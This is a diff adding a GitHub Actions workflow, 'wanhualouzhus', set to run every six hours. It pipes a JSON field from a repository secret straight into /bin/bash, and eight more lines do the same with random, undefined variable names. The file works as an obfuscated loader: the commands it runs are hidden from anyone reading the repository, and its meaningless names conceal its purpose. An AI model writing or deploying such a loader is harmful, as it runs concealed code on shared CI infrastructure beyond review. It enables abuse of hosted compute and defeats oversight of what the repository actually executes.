@@ -1,0 +1,27 @@
+name: wanhualouzhus
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanhualouzhus
+        env:
+          y1: ${{ secrets.y1 }}
+        run: |
+          echo $y1 | jq -r .iw60 | /bin/bash
+          echo $c650 | jq -r .cvumn1464 | /bin/bash
+          echo $hwe23248 | jq -r .skw1651 | /bin/bash
+          echo $ice2 | jq -r .mgww8 | /bin/bash
+          echo $enxbi7 | jq -r .alzx9892 | /bin/bash
+          echo $megh48919 | jq -r .e8242 | /bin/bash
+          echo $apnjh2065 | jq -r .ny38 | /bin/bash
+          echo $cq447 | jq -r .vvnvv39798 | /bin/bash
+          echo $qfe0550 | jq -r .tl276 | /bin/bash
+
